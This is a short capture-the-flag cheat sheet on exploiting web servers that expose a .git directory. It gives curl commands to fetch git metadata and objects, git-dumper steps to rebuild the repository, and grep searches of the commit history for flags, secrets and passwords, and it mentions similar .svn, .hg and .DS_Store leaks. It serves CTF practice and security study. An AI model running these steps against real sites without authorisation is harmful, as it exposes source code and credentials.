# Exposed `.git` directory

**Signs**: `GET /.git/HEAD` → `ref: refs/heads/main`; hint "all the changes kept", "old pages".

## Quick wins (no tools)
```bash
curl -s $T/.git/HEAD
curl -s $T/.git/config                 # remote URL, user
curl -s $T/.git/logs/HEAD              # every commit: hash, author, **message** (flags hide here)
curl -s $T/.git/COMMIT_EDITMSG
curl -s $T/.git/packed-refs
```

## Dump and rebuild the repo
```bash
pip install git-dumper
git-dumper $T/.git/ out_repo            # tools/git-dumper.md
cd out_repo
git log --all --oneline --stat          # history, including "removed secret" commits
git log -p --all | grep -n 'flag{'      # diffs of every commit
git show <hash>                         # a specific commit
git stash list; git fsck --lost-found   # dangling objects
grep -rI 'flag{\|SECRET\|password' .
```
Works even without directory listing — git-dumper guesses object paths from refs and packs.

Manual object read (if you know a hash):
```bash
curl -s $T/.git/objects/ab/cdef... | python -c "import zlib,sys;print(zlib.decompress(sys.stdin.buffer.read()))"
```

Also check `/.svn/entries`, `/.svn/wc.db`, `/.hg/`, `/.DS_Store` (lists filenames; `python -m ds_store`).

Seen in: `leak4` (flag in the first commit message → `/.git/logs/HEAD`).
